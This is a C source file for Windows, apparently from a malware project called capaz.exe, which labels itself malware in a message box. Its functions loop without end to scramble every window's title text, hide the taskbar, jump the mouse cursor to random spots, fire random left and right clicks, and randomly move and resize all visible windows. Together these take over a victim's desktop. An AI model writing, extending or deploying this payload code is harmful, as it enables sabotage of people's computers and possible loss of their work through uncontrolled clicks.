#include "capaz.h"

VOID
GetRandomPath(
	_Inout_ PWSTR szRandom,
	_In_    INT   nLength
)
{
	for ( INT i = 0; i < nLength; i++ )
	{
		szRandom[ i ] = ( WCHAR )( Xorshift32( ) % ( 0x9FFF - 0x4E00 + 1 ) + 0x4E00 );
	}
}

BOOL
CALLBACK
EnumThreadTextProc(
	_In_ HWND   hwnd,
	_In_ LPARAM lParam
)
{
	WCHAR szWndText[ 256 ];
	for ( INT i = 0; i < 256; i++ )
	{
		szWndText[ i ] = ( WCHAR )( ( Xorshift32( ) % 256 ) + 256 );
	}

	SetWindowTextW( hwnd, szWndText );
	return TRUE;
}

VOID
WINAPI
EnumThreadText(
	VOID
)
{
	for ( ;; )
	{
		EnumWindows( EnumThreadTextProc, TRUE );
		Sleep( 100 );
	}
}

BOOL
WINAPI
NoTaskbar(
	VOID
)
{
	HWND hTaskbarWnd = FindWindowW( L"Shell_TrayWnd", 0 );
	BOOL bSuccess = ShowWindow( hTaskbarWnd, SW_HIDE );

	if ( !bSuccess )
	{
		MessageBoxW( NULL, L"I don't like this malware too much... - UltraDasher965", L"capaz.exe", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL );
		ExitProcess( 0 );
		return FALSE;
	}

	return TRUE;
}

VOID
WINAPI
CursorMove(
	VOID
)
{
	POINT ptScreen = GetVirtualScreenPos( );
	SIZE szScreen = GetVirtualScreenSize( );

	for ( ;; )
	{
		SetCursorPos( Xorshift32( ) % szScreen.cx, Xorshift32( ) % szScreen.cy );
		Sleep( 10 );
	}
}

VOID
WINAPI
CursorClick(
	VOID
)
{
	INT nClickerEvents[ 2 ][ 2 ] = {
		{ MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP },
		{ MOUSEEVENTF_RIGHTDOWN, MOUSEEVENTF_RIGHTUP }
	};

	for ( ;; )
	{
		INT nClickIndex = Xorshift32( ) % 2;

		mouse_event( nClickerEvents[ nClickIndex ][ 0 ], 0, 0, 0, 0 );
		Sleep( Xorshift32( ) % 70 + 50 );

		mouse_event( nClickerEvents[ nClickIndex ][ 1 ], 0, 0, 0, 0 );
		Sleep( Xorshift32( ) % 70 + 50 );
	}
}

BOOL
CALLBACK
MoveWindowProc(
	_In_ HWND   hwnd,
	_In_ LPARAM lParam
)
{
	POINT ptScreen = GetVirtualScreenPos( );
	SIZE szScreen = GetVirtualScreenSize( );

	if ( !IsWindowVisible( hwnd ) || IsIconic( hwnd ) )
	{
		return TRUE;
	}

	INT x = Xorshift32( ) % szScreen.cx;
	INT y = Xorshift32( ) % szScreen.cy;

	INT width = Xorshift32( ) % szScreen.cx / 2 + 100;
	INT height = Xorshift32( ) % szScreen.cy / 2 + 100;

	SetWindowPos( hwnd, HWND_TOP, x, y, width, height, SWP_NOACTIVATE | SWP_NOREDRAW );
	Sleep( Xorshift32( ) % 2000 );
	return TRUE;
}

VOID
WINAPI
EnumThreadWnd(
	VOID
)
{
	for ( ;; )
	{
		EnumWindows( MoveWindowProc, TRUE );
		Sleep( 100 );
	}
}